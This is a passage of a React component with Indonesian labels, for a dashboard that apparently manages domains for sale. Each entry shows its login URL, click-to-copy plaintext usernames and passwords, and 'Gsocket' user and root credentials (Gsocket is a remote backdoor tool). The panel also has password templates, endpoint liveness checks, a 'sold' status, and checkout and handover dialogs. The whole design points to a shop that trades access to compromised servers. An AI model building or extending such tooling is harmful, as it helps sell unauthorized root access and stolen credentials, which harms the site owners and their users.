                          <div className="flex flex-wrap items-center gap-1">
                            {passTemplates.map((tpl) => (
                              <div
                                key={tpl}
                                className="inline-flex items-center space-x-1 px-2 py-0.5 bg-amber-50 text-amber-900 border border-amber-200 rounded text-[10px] font-bold max-w-[150px] truncate"
                              >
                                <button
                                  type="button"
                                  onClick={() => setEditForm((prev) => ({ ...prev, login_password: tpl }))}
                                  className="hover:underline font-mono truncate"
                                  title={tpl}
                                >
                                  {tpl}
                                </button>
                                <button
                                  type="button"
                                  onClick={(e) => handleRemovePassTemplate(tpl, e)}
                                  className="text-amber-500 hover:text-rose-600 ml-0.5 shrink-0"
                                  title={`Hapus template password '${tpl}'`}
                                >
                                  ×
                                </button>
                              </div>
                            ))}

                            <button
                              type="button"
                              onClick={handleAddPassTemplate}
                              className="px-2 py-0.5 bg-indigo-50 hover:bg-indigo-100 text-indigo-700 border border-indigo-200 rounded text-[10px] font-bold flex items-center space-x-0.5"
                              title="Tambah Template Password Baru"
                            >
                              <Plus className="w-3 h-3" />
                              <span>Tambah</span>
                            </button>
                          </div>
                        </div>
                        <input
                          type="text"
                          value={editForm.login_password}
                          onChange={(e) => setEditForm({ ...editForm, login_password: e.target.value })}
                          placeholder="Kosongkan atau pilih template di atas"
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 font-mono focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      <div>
                        <label className="block text-slate-600 font-semibold mb-1">Email Kontak</label>
                        <input
                          type="email"
                          value={editForm.email}
                          onChange={(e) => setEditForm({ ...editForm, email: e.target.value })}
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      <div>
                        <label className="block text-slate-600 font-semibold mb-1">Gsocket User (RAW)</label>
                        <input
                          type="text"
                          value={editForm.gsocket_user}
                          onChange={(e) => setEditForm({ ...editForm, gsocket_user: e.target.value })}
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 font-mono focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      <div>
                        <label className="block text-slate-600 font-semibold mb-1">Gsocket Root (RAW)</label>
                        <input
                          type="text"
                          value={editForm.gsocket_root}
                          onChange={(e) => setEditForm({ ...editForm, gsocket_root: e.target.value })}
                          className="w-full p-2 bg-white border border-slate-300 rounded-xl text-slate-900 font-mono focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                      </div>

                      <div className="flex justify-end space-x-2 pt-2 border-t border-slate-200">
                        <button
                          type="button"
                          onClick={() => setIsEditingRightPane(false)}
                          className="px-3 py-1.5 font-semibold text-slate-600 hover:bg-slate-200 rounded-xl"
                        >
                          Batal
                        </button>
                        <button
                          type="button"
                          onClick={() => handleSaveEditRightPane(activeSelectedRow.id)}
                          disabled={savingEdit}
                          className="px-4 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white font-bold rounded-xl flex items-center space-x-1.5 shadow-sm"
                        >
                          <Check className="w-4 h-4" />
                          <span>{savingEdit ? 'Menyimpan...' : 'Simpan Perubahan'}</span>
                        </button>
                      </div>
                    </div>
                  ) : (
                    /* Normal Detail Cards in Right Pane */
                    <div className="space-y-4 text-xs">
                      {/* Domain, Primary Endpoint & IP Info Card */}
                      <div className="bg-slate-50 border border-slate-200 rounded-xl p-3.5 space-y-2">
                        <div className="font-bold text-slate-900 text-xs border-b border-slate-200/80 pb-1">
                          Informasi Umum
                        </div>

                        {/* Primary Endpoint Display */}
                        {(() => {
                          const primaryEp = activeDetailCache.data.endpoints?.find((e: any) => e.is_primary) || activeDetailCache.data.endpoints?.[0];
                          return primaryEp ? (
                            <div className="flex items-center justify-between">
                              <span className="text-slate-500 font-medium">Primary Endpoint:</span>
                              <div className="flex items-center space-x-1 truncate max-w-[200px]">
                                <span
                                  className={`px-1.5 py-0.2 rounded text-[9px] font-bold shrink-0 ${
                                    primaryEp.status_code >= 200 && primaryEp.status_code < 300
                                      ? 'bg-emerald-100 text-emerald-800'
                                      : primaryEp.status_code >= 300 && primaryEp.status_code < 400
                                      ? 'bg-sky-100 text-sky-800'
                                      : primaryEp.status_code === 401 || primaryEp.status_code === 403
                                      ? 'bg-amber-100 text-amber-800'
                                      : primaryEp.status_code >= 400
                                      ? 'bg-rose-100 text-rose-800'
                                      : 'bg-slate-100 text-slate-600'
                                  }`}
                                >
                                  {primaryEp.status_code ? `HTTP ${primaryEp.status_code}` : primaryEp.is_active ? 'LIVE' : 'UNCHECKED'}
                                </span>
                                <a
                                  href={primaryEp.url}
                                  target="_blank"
                                  rel="noreferrer"
                                  className="text-indigo-600 font-mono text-[11px] hover:underline truncate"
                                >
                                  {primaryEp.url}
                                </a>
                                <button
                                  onClick={() => copyToClipboard(primaryEp.url, 'Primary Endpoint URL')}
                                  className="text-slate-400 hover:text-indigo-600 shrink-0"
                                  title="Copy Primary Endpoint URL"
                                >
                                  <Copy className="w-3 h-3" />
                                </button>
                              </div>
                            </div>
                          ) : null;
                        })()}

                        <div className="flex items-center justify-between">
                          <span className="text-slate-500">IP Address:</span>
                          <button
                            onClick={() => copyToClipboard(activeDetailCache.data.ip, 'IP Address')}
                            className="font-mono text-slate-900 font-bold hover:text-indigo-600 flex items-center space-x-1 cursor-pointer"
                            title="Klik untuk salin IP Address"
                          >
                            <span>{activeDetailCache.data.ip || 'UNRESOLVED'}</span>
                            <Copy className="w-3 h-3 text-slate-400 hover:text-indigo-600" />
                          </button>
                        </div>

                        {activeDetailCache.data.login_url && (
                          <div className="flex items-center justify-between">
                            <span className="text-slate-500">Login URL:</span>
                            <div className="flex items-center space-x-1 truncate max-w-[180px]">
                              <a href={activeDetailCache.data.login_url} target="_blank" rel="noreferrer" className="text-indigo-600 font-mono hover:underline truncate">
                                {activeDetailCache.data.login_url}
                              </a>
                              <button onClick={() => copyToClipboard(activeDetailCache.data.login_url, 'Login URL')} className="text-slate-400 hover:text-indigo-600 shrink-0">
                                <Copy className="w-3 h-3" />
                              </button>
                            </div>
                          </div>
                        )}

                        {activeDetailCache.data.email && (
                          <div className="flex items-center justify-between">
                            <span className="text-slate-500">Email:</span>
                            <button onClick={() => copyToClipboard(activeDetailCache.data.email, 'Email')} className="text-slate-900 font-semibold hover:text-indigo-600 flex items-center space-x-1 cursor-pointer">
                              <span>{activeDetailCache.data.email}</span>
                              <Copy className="w-3 h-3 text-slate-400" />
                            </button>
                          </div>
                        )}
                      </div>

                      {/* Interactive Click-to-Copy Raw Plaintext Credentials Card */}
                      <div className="bg-slate-50 border border-slate-200 rounded-xl p-3.5 space-y-2">
                        <div className="font-bold text-slate-900 text-xs border-b border-slate-200/80 pb-1 flex items-center justify-between">
                          <div className="flex items-center space-x-1">
                            <ShieldCheck className="w-3.5 h-3.5 text-indigo-600" />
                            <span>Kredensial Raw Plaintext</span>
                          </div>
                          <span className="text-[10px] text-slate-400 font-normal">Klik nilai untuk salin 📋</span>
                        </div>

                        {/* Username Row */}
                        <div
                          onClick={() => copyToClipboard(activeDetailCache.data.login_user, 'Username')}
                          className="flex items-center justify-between p-2 bg-white rounded-lg border border-slate-200 hover:border-indigo-300 hover:bg-indigo-50/50 cursor-pointer transition-all group"
                          title="Klik untuk menyalin Username"
                        >
                          <span className="text-slate-500 font-medium">Username:</span>
                          <div className="flex items-center space-x-1.5">
                            <span className="font-mono text-slate-900 font-bold group-hover:text-indigo-700 transition-colors">
                              {activeDetailCache.data.login_user || '-'}
                            </span>
                            <Copy className="w-3 h-3 text-slate-400 group-hover:text-indigo-600 transition-colors" />
                          </div>
                        </div>

                        {/* Password RAW Row */}
                        <div
                          onClick={() => copyToClipboard(activeDetailCache.data.credentials.login_password, 'Password (RAW)')}
                          className="flex items-center justify-between p-2 bg-white rounded-lg border border-slate-200 hover:border-amber-300 hover:bg-amber-50/50 cursor-pointer transition-all group"
                          title="Klik untuk menyalin Password (RAW)"
                        >
                          <span className="text-slate-500 font-medium">Password (RAW):</span>
                          <div className="flex items-center space-x-1.5">
                            <span className="font-mono text-amber-900 font-bold bg-amber-50 group-hover:bg-amber-100 px-1.5 py-0.5 rounded border border-amber-200 select-all transition-colors">
                              {activeDetailCache.data.credentials.login_password || '-'}
                            </span>
                            <Copy className="w-3 h-3 text-slate-400 group-hover:text-amber-600 transition-colors" />
                          </div>
                        </div>

                        {/* Gsocket User RAW Row */}
                        {activeDetailCache.data.credentials.gsocket_user && (
                          <div
                            onClick={() => copyToClipboard(activeDetailCache.data.credentials.gsocket_user, 'Gsocket User (RAW)')}
                            className="flex items-center justify-between p-2 bg-white rounded-lg border border-slate-200 hover:border-indigo-300 hover:bg-indigo-50/50 cursor-pointer transition-all group"
                            title="Klik untuk menyalin Gsocket User (RAW)"
                          >
                            <span className="text-slate-500 font-medium">Gsocket User (RAW):</span>
                            <div className="flex items-center space-x-1.5">
                              <span className="font-mono text-indigo-900 font-bold bg-indigo-50 group-hover:bg-indigo-100 px-1.5 py-0.5 rounded border border-indigo-100 transition-colors">
                                {activeDetailCache.data.credentials.gsocket_user}
                              </span>
                              <Copy className="w-3 h-3 text-slate-400 group-hover:text-indigo-600 transition-colors" />
                            </div>
                          </div>
                        )}

                        {/* Gsocket Root RAW Row */}
                        {activeDetailCache.data.credentials.gsocket_root && (
                          <div
                            onClick={() => copyToClipboard(activeDetailCache.data.credentials.gsocket_root, 'Gsocket Root (RAW)')}
                            className="flex items-center justify-between p-2 bg-white rounded-lg border border-rose-200 bg-rose-50/50 hover:bg-rose-100/60 hover:border-rose-300 cursor-pointer transition-all group"
                            title="Klik untuk menyalin Gsocket Root (RAW)"
                          >
                            <span className="text-rose-800 font-bold flex items-center space-x-1">
                              <span>Gsocket Root (RAW):</span>
                              <span className="px-1 py-0.2 rounded text-[9px] font-black bg-rose-600 text-white">ROOT</span>
                            </span>
                            <div className="flex items-center space-x-1.5">
                              <span className="font-mono text-rose-900 font-extrabold bg-rose-100 group-hover:bg-rose-200 px-1.5 py-0.5 rounded border border-rose-200 transition-colors">
                                {activeDetailCache.data.credentials.gsocket_root}
                              </span>
                              <Copy className="w-3 h-3 text-rose-400 group-hover:text-rose-700 transition-colors" />
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Endpoints Manager Section */}
                  <div className="bg-slate-50 border border-slate-200 rounded-xl p-3.5 space-y-2.5 text-xs">
                    <div className="font-bold text-slate-900 text-xs border-b border-slate-200/80 pb-1">
                      Daftar Endpoint ({activeDetailCache.data.endpoints?.length || 0})
                    </div>

                    {activeDetailCache.data.status !== 'sold' && (
                      <form onSubmit={(e) => handleAddEndpointInline(e, activeSelectedRow.id)} className="flex space-x-2">
                        <input
                          type="url"
                          placeholder="URL endpoint baru (https://...)"
                          value={newEndpointUrl}
                          onChange={(e) => setNewEndpointUrl(e.target.value)}
                          required
                          className="flex-1 px-2.5 py-1.5 text-xs bg-white border border-slate-300 rounded-xl text-slate-900 focus:ring-2 focus:ring-indigo-600 focus:outline-none"
                        />
                        <button
                          type="submit"
                          disabled={addingEp || !newEndpointUrl.trim()}
                          className="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl font-bold flex items-center space-x-1 shrink-0"
                        >
                          <Plus className="w-3.5 h-3.5" />
                          <span>Tambah</span>
                        </button>
                      </form>
                    )}

                    <div className="space-y-2">
                      {activeDetailCache.data.endpoints?.map((epItem: any) => (
                        <div key={epItem.id} className="p-2 bg-white border border-slate-200 rounded-xl flex items-center justify-between text-xs">
                          <div className="min-w-0 pr-2 flex-1">
                            <div className="flex items-center space-x-1 mb-0.5">
                              {epItem.is_primary && (
                                <span className="px-1.5 py-0.2 bg-indigo-600 text-white text-[9px] font-bold rounded">PRIMARY</span>
                              )}
                              <span className={`px-1.5 py-0.2 text-[9px] font-bold rounded ${epItem.is_active ? 'bg-emerald-100 text-emerald-800' : 'bg-slate-200 text-slate-700'}`}>
                                {epItem.status_code ? `HTTP ${epItem.status_code}` : epItem.is_active ? 'LIVE' : 'UNCHECKED'}
                              </span>
                            </div>
                            <div className="flex items-center space-x-1">
                              <a href={epItem.url} target="_blank" rel="noreferrer" className="font-mono text-[11px] text-slate-800 hover:text-indigo-600 truncate flex-1">
                                {epItem.url}
                              </a>
                              <button
                                onClick={() => copyToClipboard(epItem.url, 'Endpoint URL')}
                                title="Copy Endpoint URL"
                                className="text-slate-400 hover:text-indigo-600 shrink-0"
                              >
                                <Copy className="w-3 h-3" />
                              </button>
                            </div>
                          </div>

                          {activeDetailCache.data.status !== 'sold' && (
                            <div className="flex items-center space-x-1 shrink-0 ml-1">
                              {!epItem.is_primary && (
                                <button
                                  onClick={() => handleSetPrimaryInline(epItem.id, activeSelectedRow.id)}
                                  className="px-1.5 py-0.5 bg-slate-100 hover:bg-indigo-50 text-indigo-600 text-[10px] font-bold rounded border border-slate-200"
                                >
                                  Primary
                                </button>
                              )}
                              <button
                                onClick={() => handleDeleteEndpointInline(epItem.id, activeSelectedRow.id)}
                                className="p-1 text-slate-400 hover:text-rose-600 rounded hover:bg-rose-50"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                              </button>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>
              ) : null}

            </div>
          ) : (
            /* Empty State when no row is selected */
            <div className="bg-white border border-slate-200 border-dashed rounded-2xl p-8 text-center text-slate-400 space-y-3">
              <div className="w-12 h-12 rounded-2xl bg-slate-50 text-slate-400 flex items-center justify-center mx-auto border border-slate-200">
                <Globe className="w-6 h-6" />
              </div>
              <div>
                <h4 className="font-bold text-slate-700 text-sm">Pilih Domain dari Tabel</h4>
                <p className="text-xs text-slate-400 mt-1 max-w-xs mx-auto">
                  Klik pada baris mana saja di tabel sebelah kiri untuk melihat detail, kredensial raw plaintext, dan kelola endpoint.
                </p>
              </div>
            </div>
          )}
        </div>

      </div>

      {/* Floating Multi-Select Bar with Copy Domain, Copy URL (https://), and Copy Endpoint Actions */}
      <MultiSelectFloatingBar
        selectedCount={selectedList.length}
        onClearSelection={() => setSelectedMap({})}
        onOpenCheckout={() => setIsCheckoutOpen(true)}
        onOpenHandover={() => {
          setHandoverDomains(selectedList);
          setIsHandoverOpen(true);
        }}
        onCopySelectedDomains={handleCopySelectedDomains}
        onCopySelectedUrls={handleCopySelectedUrls}
        onCopySelectedEndpoints={handleCopySelectedEndpoints}
      />

      {/* Modals */}
      <IngestionModal
        isOpen={isIngestOpen}
        onClose={() => setIsIngestOpen(false)}
        onSuccess={fetchData}
      />

      <HandoverModal
        isOpen={isHandoverOpen}
        selectedDomains={handoverDomains}
        onClose={() => setIsHandoverOpen(false)}
      />

      <CheckoutModal
        isOpen={isCheckoutOpen}
        selectedDomains={selectedList}
        onClose={() => setIsCheckoutOpen(false)}
        onSuccess={() => {
          setSelectedMap({});
          fetchData();
        }}
      />
    </div>
  );
};
